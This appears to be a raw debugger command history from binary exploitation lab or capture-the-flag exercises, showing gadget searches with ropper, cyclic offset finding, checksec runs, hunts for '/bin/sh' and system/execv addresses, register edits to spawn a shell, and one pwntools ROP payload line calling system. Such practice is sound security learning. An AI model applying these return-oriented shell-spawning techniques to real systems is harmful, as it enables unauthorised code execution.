 ropper -- --search 'pop rbp'
 ropper -- --search 'ret'
x/4x 0x00000000004011e5
search -s byte 0xC3
b main
r
search -s byte 0xC3
search -s byte 0xc3
disass main
x/x 0x00000000004013ba
disas 0x401300, 0x4013c0
disass 0x401300, 0x4013c0
info address dream_msg
disass 0x4011b6, 0x4013c0
info address dream_msg
set $rip=0x4011b6
set $rdi = &ephemereal 
continue
ropper -- --search 'pop rdi'
info address dream_msg 
p & ephemereal 
x/x 400b75
x/x 0x400b75
ropper -- --search 'pop rbp'
ropper -- --search 'pop rdi'
exit
info address is_booked
info address check_booking 
disass check_booking 
set $rip = 4014ca
set $rip = 0x4014ca
b main
r
set $rip = 0x4014ca
set $rsi = 0000000000000000a3b9c7d5e8f4a1b2c3d4e5f6789abcdeff1234567890abcdef12a4b5c6d7e8f9a0b1c2d3e4f56789abcdefabcdefabcdefabcdefabcdef
set $rsi = 0x0000000000000000a3b9c7d5e8f4a1b2c3d4e5f6789abcdeff1234567890abcdef12a4b5c6d7e8f9a0b1c2d3e4f56789abcdefabcdefabcdefabcdefabcdef
set $rsi = 0x00 + 0xa3b9c7d5e8f4a1b2c3d4e5f6789abcdeff1234567890abcdef12a4b5c6d7e8f9a0b1c2d3e4f56789abcdefabcdefabcdefabcdefabcdef
set $rsi = 0x00
b 48
d 1
info breakpoints 
r
set $rsi = 0x00
set $rdi = "/bin/sh\x00"
continue
b 47
r
d 1
b 46
r
d 2
b 44
r
d 3
b 43
r
exit
b main
search "/bin/sh"
r
search "/bin/sh"
search "/bin/sh"
exit
info address execv
exit
b main
info address execv
r
info address execv
exit
b main
r
p &souldream 
exit
b main
r
ropper -- --search "pop rsi"
p &deep_sleep 
search "/bin/sh"
search "/bin/sh"
r
search "/bin/sh"
exit
b m
b main
r
search "/bin/sh"
p "/bin/sh"
p &"/bin/sh"
p &ephemereal 
checksec 
r
ropper -- --search "sub 8, rsp"
ropper -- --search "sub rsp, 8"
checksec 
p & souldream 
b nightmare 
d 1
r
cyclic 100
r
continue
cyclic -l jaaaaaaa
checksec 
ldd
ldd help
ldd --help
ldd libc
search system
search system
search system
ropper -- --search "pop rdi; ret"
ropper -- --search "pop rdi"
info address system
info address system
search system
search "/bin/sh"
info functions system
file
info breakpoints 
d 2
info breakpoints 
b 40
file ./bin/ex2
b 40
r
exit
b 40
r
info functions deep_sleep 
search system
d 1
b deep_sleep 
r
exit
b deep_sleep 
r
d 1
b 51
r
d 2
b 44
r
ni
exit
b 49
r
ni
p system
disassemble deep_sleep 
p &"/bin/sh"
info functions deep_sleep 
ropper -- --search "pop rsi"
payload = b"/bin/sh\0" + padding + p64(pop_rsi_pop_rdi_pop_rbp_ret) + p64(0x0) + p64(0x404060) + p64(0x0) + p64(deep_sleep_system_addr)
p &souldream 
disassemble deep_sleep 
b main
r
p &puts
p &puts
p &scanf
p &scanf
p &system
exit
exit
find /bin/sh
find "/bin/sh"
r
exit
p &puts
p &puts
p &scanf
p &system
b main
r
p &scanf
disass main
p &puts
file ./bin/nightmares 
b main
d 1
info breakpoints 
cyclic 130
r
ni
ni
cyclic -l jaaaaaaa
file ex1
cyclic 400
b main
d 2
r
file ex1
exit
b main
cyclic 400
r
ni
x/4wx 0x4014d0
x/40x 0x4014d0
exit
exit
b main
file bonus
exit
b main
file bonus
file ./bonus
exit
b main
ropper -- --search "pop rdi"
ropper -- --search "jmp"
p &print_flag
info functions 
p print_flag
file bonus
info files
b *0x400a30
r
exit
checksec
b main
r
search execv
p &execv
cyclic 400
r
ni
cyclic -l saaaaaa
cyclic -l saaaaaab
x/24xb 0x4014d0-24
x/24xw 0x4014d0-24
x/24x 0x4014d0-24
exit
b main
r
p &souldream 
info address dream_msg 
ropper -- --search "pop rdi"
search system
disass deep_sleep 
b main
r
p &execv
exit
checksec
b main
r
got
ni
got
checksec
ropper -- --search "pop rdi"
ropper -- --search "ret"
ropper -- --search "pop rsi"
p 0x7ffff7f7042f 
